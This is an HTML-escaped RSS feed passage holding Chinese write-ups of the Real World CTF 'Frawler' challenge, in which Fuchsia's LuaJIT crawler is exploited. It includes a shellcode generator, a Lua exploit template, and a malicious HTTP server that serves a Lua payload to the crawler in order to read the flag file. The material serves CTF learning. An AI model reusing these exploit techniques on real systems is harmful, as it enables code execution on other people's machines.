    &lt;span class=&quot;kr&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gsub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;..&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;kr&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;string.char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;tonumber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;kr&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;kr&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
&lt;span class=&quot;kr&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;tohex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;kr&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gsub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;.&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;kr&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;string.format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;%02X&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;string.byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;kr&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;kr&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tohex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ffi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;estr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;io.open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;../../shellcode.hex&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;wb&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ffi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;--print(res)&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;--a = loadstring(string.fromhex(res))&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;--print(a())&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;gen_shellcode.py&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;from pwn import *
context(arch=&#39;amd64&#39;, os=&#39;linux&#39;)
​
shellcode = r&#39;&#39;&#39;
pop rax
sub rax, 0x71187
mov rbp, rax
add rax, 0x73370
mov rdi, %s
push rdi
mov rdi, %s
push rdi
mov rdi, rsp
push 0
push 114
mov rsi, rsp
call rax
mov rcx, rax
mov rdi, rsp
mov rsi, 100
mov rdx, 100
mov rax, rbp
add rax, 0x733c0
call rax
mov rdi, 1
mov rsi, rsp
mov rdx, 100
mov rax, rbp
add rax, 0x73510
call rax
​
push 0
ret
​
&#39;&#39;&#39;
print(shellcode)
shellcode = shellcode % (u64(&#39;a/flag&#39;.ljust(8, &#39;\x00&#39;)), u64(&#39;/pkg/dat&#39;))
​
with open(&#39;orig_exp.tpl.lua&#39;, &#39;r&#39;) as f:
    content = f.read()
    shellcode_hex = repr(asm(shellcode))
    content = content.replace(&#39;{SHELLCODE_TPL}&#39;, shellcode_hex)
    with open(&#39;orig_exp.lua&#39;, &#39;w&#39;) as f:
        f.write(content)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2&gt;&lt;b&gt;总结&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;好吧我其实当时调的过程原比现在描述的更加难受。最开始按照bt去还原的时候还没有去调试和看过luajit代码，只是去对照，看的非常费劲还分析错了，以为是zircon内无法使用jit导致的。&lt;/p&gt;&lt;p&gt;看来以后要多注意这个问题，有的背景知识还是需要多去熟悉一下才能够完整掌握。&lt;/p&gt;&lt;p&gt;调代码还是很有趣的，开源真好。还是要不断学习才做的动题目呀。&lt;/p&gt;</description>
<author>婴宁</author>
<guid isPermaLink="false">2018-12-26-53336867</guid>
<pubDate>Wed, 26 Dec 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>RW CTF Frawler WP | luajit与fuchsia的硬核玩法 (1)</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-12-26-53329563.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/53329563&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-c0b712e64e0665f318d13b303e472e98_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;作者：Anciety，r3kapig战队成员。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Frawler&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;首先感谢RWCTF的精彩题目，这道题目可以说是很有意思，虽然环境上会比较蛋疼。也感谢@David492j的帮助，从他那学习到了新的思路，以及逆向神@pizza带我5分钟理解程序在干啥。&lt;/p&gt;&lt;p&gt;不过可惜的是最后还是没有搞出来，甚至在我第一次赛后分析的时候也分析错了，给了david一个错误的说法。第二次分析才明白，我去原来就差一个字节。。非常可惜。&lt;/p&gt;&lt;p&gt;这算是个writeup，也是个我自己的分析过程吧，我觉得这个分析过程还是很有意思的，在比赛时间内没有做出来还是比较可惜的。&lt;/p&gt;&lt;p&gt;哦对了，不能忘了重要的事情，Eur3kA &amp;amp; r3kapig战队招人啦!在这个险恶的CTF环境中，你还不知道web手怎么存活吗？不知道密码学选手该怎么办吗？当然是加入Eur3kA！是的你没看错，我们竟然非常缺web手！&lt;/p&gt;&lt;p&gt;当然也欢迎其他方向的选手加入我们啦，如果你实力强劲，打算来带我们飞，也可以不选择加入Eu3kA而是直接参与r3kapig专打国际赛！&lt;/p&gt;&lt;p&gt;详情请联系&lt;a href=&quot;mailto:anciety512@gmail.com&quot;&gt;anciety512@gmail.com&lt;/a&gt;，微信ding641880047（添加好友请注明）。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;题目基本分析及背景&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;首先简单分析一下题目。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;Well, it turns out that the time machine we used to pwn suanjike is not a realworld thing :( Let&#39;s try something from the future without time traveling.
The flag is located at /pkg/data/flag in frawler&#39;s namespace.
​
nc 100.100.0.103 31337
No undisclosed bug in public codes required. (Technically they should not be called &quot;0-day&quot; as the entire stack is in experimental state anyway.)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;题目的提示里只说了flag文件在&lt;code&gt;/pkg/data/flag&lt;/code&gt;里，看来还要进行一定分析。&lt;/p&gt;&lt;p&gt;题目文件比较大，下下来之后发现有一个qemu和一系列包，其实我之前有玩过fuchsia系统，所以看到这还是能基本确定这题和fuchsia相关的，毕竟有一个&lt;code&gt;run-zircon&lt;/code&gt;文件。&lt;/p&gt;&lt;p&gt;题目文件：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;pkg
├── exe
│   ├── frawler
│   └── frawler-host
├── img
│   ├── fuchsia.zbi
│   ├── fvm.blk
│   └── multiboot.bin
├── qemu
│   ├── bin
│   │   ├── ivshmem-client
│   │   ├── ivshmem-server
│   │   ├── qemu-img
│   │   ├── qemu-io
│   │   ├── qemu-nbd
│   │   ├── qemu-system-aarch64
│   │   └── qemu-system-x86_64
│   ├── libexec
│   │   └── qemu-bridge-helper
│   └── share
│       └── qemu
│           ├── acpi-dsdt.aml
│           ├── bamboo.dtb
│           ├── bios-256k.bin
│           ├── bios.bin
│           ├── efi-e1000e.rom
│           ├── efi-e1000.rom
│           ├── efi-eepro100.rom
│           ├── efi-ne2k_pci.rom
│           ├── efi-pcnet.rom
│           ├── efi-rtl8139.rom
│           ├── efi-virtio.rom
│           ├── efi-vmxnet3.rom
│           ├── keymaps
│           │   ├── ar
│           │   ├── bepo
│           │   ├── common
│           │   ├── cz
│           │   ├── da
│           │   ├── de
│           │   ├── de-ch
│           │   ├── en-gb
│           │   ├── en-us
│           │   ├── es
│           │   ├── et
│           │   ├── fi
│           │   ├── fo
│           │   ├── fr
│           │   ├── fr-be
│           │   ├── fr-ca
│           │   ├── fr-ch
│           │   ├── hr
│           │   ├── hu
│           │   ├── is
│           │   ├── it
│           │   ├── ja
│           │   ├── lt
│           │   ├── lv
│           │   ├── mk
│           │   ├── modifiers
│           │   ├── nl
│           │   ├── nl-be
│           │   ├── no
│           │   ├── pl
│           │   ├── pt
│           │   ├── pt-br
│           │   ├── ru
│           │   ├── sl
│           │   ├── sv
│           │   ├── th
│           │   └── tr
│           ├── kvmvapic.bin
│           ├── linuxboot.bin
│           ├── linuxboot_dma.bin
│           ├── multiboot.bin
│           ├── openbios-ppc
│           ├── openbios-sparc32
│           ├── openbios-sparc64
│           ├── palcode-clipper
│           ├── petalogix-ml605.dtb
│           ├── petalogix-s3adsp1800.dtb
│           ├── ppc_rom.bin
│           ├── pxe-e1000.rom
│           ├── pxe-eepro100.rom
│           ├── pxe-ne2k_pci.rom
│           ├── pxe-pcnet.rom
│           ├── pxe-rtl8139.rom
│           ├── pxe-virtio.rom
│           ├── QEMU,cgthree.bin
│           ├── qemu-icon.bmp
│           ├── qemu_logo_no_text.svg
│           ├── QEMU,tcx.bin
│           ├── qemu_vga.ndrv
│           ├── s390-ccw.img
│           ├── s390-netboot.img
│           ├── sgabios.bin
│           ├── skiboot.lid
│           ├── slof.bin
│           ├── spapr-rtas.bin
│           ├── trace-events-all
│           ├── u-boot.e500
│           ├── vgabios.bin
│           ├── vgabios-cirrus.bin
│           ├── vgabios-qxl.bin
│           ├── vgabios-stdvga.bin
│           ├── vgabios-virtio.bin
│           └── vgabios-vmware.bin
├── README.md
├── run.sh
├── run-zircon
└── start-dhcp-server.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;题目文件看起来比较多，一个重点的提示是&lt;code&gt;run-zircon&lt;/code&gt;，&lt;code&gt;zircon&lt;/code&gt;是fuchsia的内核，所以看来这道题的环境是fuchsia系统了。&lt;/p&gt;&lt;p&gt;另外一个比较显然的是，&lt;code&gt;exe&lt;/code&gt;里肯定是题目文件了。&lt;/p&gt;&lt;p&gt;在进行下一步分析之前，我们现在需要了解一下fuchsia系统。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Fuchsia系统&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;http://link.zhihu.com/?target=https%3A//en.wikipedia.org/wiki/Google_Fuchsia&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;Fuchsia操作系统&lt;/a&gt;是google正在开发中的一个系统，其实相关消息并不是很多，不过其已经开源，且文档有大量的描述，一些基本知识还是很容易学到的。&lt;/p&gt;&lt;p&gt;从操作系统分类来看，fuchsia采用了微内核的架构（想起了windows？），且并没有完全采取posix标准，所以在很多方面与我们熟知的linux有一些显著差距，接下来我们来看看我们在pwn的过程当中需要了解的一些基本内容。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;系统设计&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;fuchsia的总体设计其实和windows比较接近，相对linux来说，内核空间的数据被封装成对象，在用户空间以handle的形式体现，而调用系统调用完成操作的过程就是通过传递handle去实现的，handle又具有一定程度的权限检查。&lt;/p&gt;&lt;p&gt;但是其实到这里对我们的利用都没有造成很大的影响，毕竟我们只是在用户空间去pwn，我们只需要能调用库函数或者调用系统调用就可以了。而对我们的pwn能产生影响的最主要的部分其实是系统调用的机制。&lt;/p&gt;&lt;p&gt;在linux里我们如果想要完成系统调用，如果能够执行任意代码，那只需要根据系统调用表去设置好相应寄存器和栈参数即可，但是在zircon内核(fuchsia的内核)中，系统调用是通过&lt;b&gt;vDSO&lt;/b&gt;来完成的。&lt;/p&gt;&lt;p&gt;熟悉linux用户空间pwn的同学应该对&lt;code&gt;vDSO&lt;/code&gt;并不陌生，但是这里与linux的一个最关键区别在于，在linux中&lt;code&gt;vDSO&lt;/code&gt;是为了加速系统调用存在的，而在zircon中，这是&lt;b&gt;唯一一种进行系统调用&lt;/b&gt;的方法，如果直接使用&lt;code&gt;syscall&lt;/code&gt;汇编指令，内核会对来源进行check，这样的访问是会被拒绝的。&lt;/p&gt;&lt;p&gt;所以在利用当中我们需要注意的一个关键问题就是如何进行系统调用的问题，当然，如果具有库函数地址等就最好了。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;系统环境处理&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;其实这一点我应该没有什么资格来说。。因为其实我并没有把环境真正搭起来。。&lt;/p&gt;&lt;p&gt;这个地方其实比较值得吐槽，当然由于这个系统也在非常早期的阶段，这些也还可以接受吧。&lt;/p&gt;&lt;p&gt;环境上主要是需要调试和文件拷贝（因为需要把libc等拷贝出来），而fuchsia系统采用了多层次的概念，内核层位于&lt;a href=&quot;http://link.zhihu.com/?target=https%3A//github.com/fuchsia-mirror/zircon&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;zircon&lt;/a&gt;，拷贝工具在zircon中，还好，zircon层并不算太大，不过为了编译这个也是花了不少精力，最终采用了在VPS上编译之后下下来的方法。。（感谢@sakura鼎力相助）&lt;/p&gt;&lt;p&gt;另外调试这一部分就更为麻烦了，因为调试器其实位于&lt;a href=&quot;http://link.zhihu.com/?target=https%3A//github.com/fuchsia-mirror/garnet&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;garnet&lt;/a&gt;层，我个人认为garnet层算是比较大的，在调试器文档中其实说是有SDK的，但是似乎并没有已经编译好的SDK的可以下载，所以只能自己编译，所以最终我采用了。。。不使用调试器的方法。&lt;/p&gt;&lt;p&gt;这里其实好像还有一个方法可以处理调试，由于后来并没有太需求调试功能，所以我没有去尝试。那就是通过在启动的时候(&lt;code&gt;run.sh&lt;/code&gt;中)的&lt;code&gt;run-zircon&lt;/code&gt;命令最后加上&lt;code&gt;--debugger&lt;/code&gt;选项，这样可以用gdb去连接1234端口（其实这里和调试linux内核一样，本质上也是调试zircon内核）。之后通过ps查看到进程号之后可以通过vmaps去查看mapping，之后下断点到启动新进程的地方去使用gdb调试。如果有尝试这种方法进行调试的可以告诉我一下是否存在其他问题。。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;继续分析&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;好了我们现在已经了解了一些fuchsia系统的基础了，对于更深入的了解，可以查看&lt;a href=&quot;http://link.zhihu.com/?target=https%3A//fuchsia.googlesource.com/docs/%2B/HEAD/README.md&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;fuchsia文档&lt;/a&gt;（google服务器），之后我就不再详细描述fuchsia系统相关基础知识了。&lt;/p&gt;&lt;p&gt;在了解了这些之后我们就可以开始逆一下程序看看功能了，首先是&lt;code&gt;frawler-host&lt;/code&gt;。&lt;/p&gt;&lt;p&gt;这个程序其实不怎么需要详细的去逆向，因为根据README:&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;1. `tunctl -u $USER -t qemu`
2. Run `run.sh`.
3. Wait about 1 minute.
4. Service is running on 192.168.1.53:31337
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里启动之后是有一个service的，之后对照一下可以发现：&lt;/p&gt;&lt;figure&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-ca79ce130235cad0d78d966419f355ad_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1411&quot; data-rawheight=&quot;656&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1411&quot; data-original=&quot;https://pic2.zhimg.com/v2-ca79ce130235cad0d78d966419f355ad_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-ca79ce130235cad0d78d966419f355ad_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1411&quot; data-rawheight=&quot;656&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1411&quot; data-original=&quot;https://pic2.zhimg.com/v2-ca79ce130235cad0d78d966419f355ad_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-ca79ce130235cad0d78d966419f355ad_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;很明显的启动tcp服务器的操作，所以我并没有对这个程序进行仔细的逆向（pizza: 要是我，看一眼就猜出来了，不用逆）， 所以重点去关注&lt;code&gt;frawler&lt;/code&gt;程序。&lt;/p&gt;&lt;figure&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-58d5a77fb638b77ba038d99e10910a69_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1430&quot; data-rawheight=&quot;768&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1430&quot; data-original=&quot;https://pic2.zhimg.com/v2-58d5a77fb638b77ba038d99e10910a69_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-58d5a77fb638b77ba038d99e10910a69_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1430&quot; data-rawheight=&quot;768&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1430&quot; data-original=&quot;https://pic2.zhimg.com/v2-58d5a77fb638b77ba038d99e10910a69_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-58d5a77fb638b77ba038d99e10910a69_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;大致一看，有&lt;code&gt;robots.txt&lt;/code&gt;，联系一下题目名字&lt;code&gt;frawler&lt;/code&gt;，猜测是&lt;code&gt;fuchsia crawler&lt;/code&gt;的意思，那么应该就是一个爬虫一样的逻辑了。（这里比较尴尬，我不小心把pizza给我的idb给删了，所以看起来比较难看）&lt;/p&gt;&lt;p&gt;总的来说，逻辑基本上是首先连通之后，会发一个http请求，请求robots.txt，然后会解析robots.txt，去爬取&lt;code&gt;Disallow&lt;/code&gt;的内容（专爬&lt;code&gt;Disallow&lt;/code&gt;？？）&lt;/p&gt;&lt;p&gt;这里一个比较有意思的地方：&lt;/p&gt;&lt;figure&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-2fb911b79849c35efda6e72bfd94b50a_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1033&quot; data-rawheight=&quot;745&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1033&quot; data-original=&quot;https://pic3.zhimg.com/v2-2fb911b79849c35efda6e72bfd94b50a_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-2fb911b79849c35efda6e72bfd94b50a_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1033&quot; data-rawheight=&quot;745&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1033&quot; data-original=&quot;https://pic3.zhimg.com/v2-2fb911b79849c35efda6e72bfd94b50a_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-2fb911b79849c35efda6e72bfd94b50a_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;一个&lt;code&gt;text/x-lua&lt;/code&gt;引起了注意。。这里其实最终是pizza逆的，不过基本看看可以猜一下：&lt;/p&gt;&lt;figure&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-504233a324b9fbf896bd130cec300965_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1135&quot; data-rawheight=&quot;720&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1135&quot; data-original=&quot;https://pic2.zhimg.com/v2-504233a324b9fbf896bd130cec300965_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-504233a324b9fbf896bd130cec300965_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1135&quot; data-rawheight=&quot;720&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1135&quot; data-original=&quot;https://pic2.zhimg.com/v2-504233a324b9fbf896bd130cec300965_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-504233a324b9fbf896bd130cec300965_b.jpg&quot;&gt;&lt;/figure&gt;&lt;figure&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-4109417ffcf4abca5c270970bfb764a5_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1190&quot; data-rawheight=&quot;610&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1190&quot; data-original=&quot;https://pic2.zhimg.com/v2-4109417ffcf4abca5c270970bfb764a5_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-4109417ffcf4abca5c270970bfb764a5_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1190&quot; data-rawheight=&quot;610&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1190&quot; data-original=&quot;https://pic2.zhimg.com/v2-4109417ffcf4abca5c270970bfb764a5_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-4109417ffcf4abca5c270970bfb764a5_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;虽然猜起来可能比较难受，但是看到&lt;code&gt;luajit&lt;/code&gt;我们应该大致明白了，这里肯定是执行了lua代码（不然传入luajit干嘛？），然后其他的部分是可以对比相应版本的luajit代码去逆向的，最终可以知道他执行了途中那个看起来像hash值一样的lua函数，所以在response的时候给出这个lua函数就可以执行lua函数了。&lt;/p&gt;&lt;p&gt;这里分享一下pizza的脚本，巧妙的用了pwntools的功能来把request和response进行了转发，这样就可以写一个真正的server来完成任务了:&lt;/p&gt;&lt;p&gt;request.py:&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;from pwn import *
context.log_level = &quot;debug&quot;
​
frawler = remote(&quot;192.168.3.53&quot;, 31337)
srv = remote(&quot;localhost&quot;, 31337)
frawler.connect_both(srv)
​
frawler.wait_for_close()
srv.wait_for_close()
frawler.close()
srv.close()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;forward.py:&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;#!/usr/bin/python
# -*- coding: UTF-8 -*-
​
from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
​
class TestHTTPHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.protocal_version = &#39;HTTP/1.1&#39;
        self.send_response(200)
        print(self.path)
        if(self.path == &quot;/robots.txt&quot;):
            content = &quot;&quot;
            content += &quot;Disallow: /a.txt\r\n&quot;
            content += &quot;Disallow: /b.txt\r\n&quot;
            #content += &quot;Disallow: /c.txt\r\n&quot;
            #content += &quot;Disallow: /d.txt\r\n&quot;
​
        elif(self.path == &quot;/a.txt&quot;):
            with open(&quot;script.lua&quot;, &quot;r&quot;) as f:
                content = f.read()
                with open(&#39;shellcode.hex&#39;, &#39;r&#39;) as fs:
                    content = content.format(fs.read())
            self.send_header(&quot;Content-Type&quot;, &quot;text/x-lua&quot;)
        elif(self.path == &quot;/b.txt&quot;):
            content = &quot;hello world b&quot;
            self.send_header(&quot;Content-Type&quot;, &quot;text/html&quot;)
        elif(self.path == &quot;/c.txt&quot;):
            content = &quot;hello world c&quot;
            self.send_header(&quot;Content-Type&quot;, &quot;text/html&quot;)
        elif(self.path == &quot;/d.txt&quot;):
            content = &quot;hello world d&quot;
            self.send_header(&quot;Content-Type&quot;, &quot;text/html&quot;)
​
        self.close_connection = 0
        self.send_header(&quot;Content-Length&quot;, str(len(content)))
        self.end_headers()
        self.wfile.write(content)
​
​
def start_server(port):
    http_server = HTTPServer((&#39;localhost&#39;, int(port)), TestHTTPHandler)
    http_server.serve_forever()
​
​
start_server(31337)
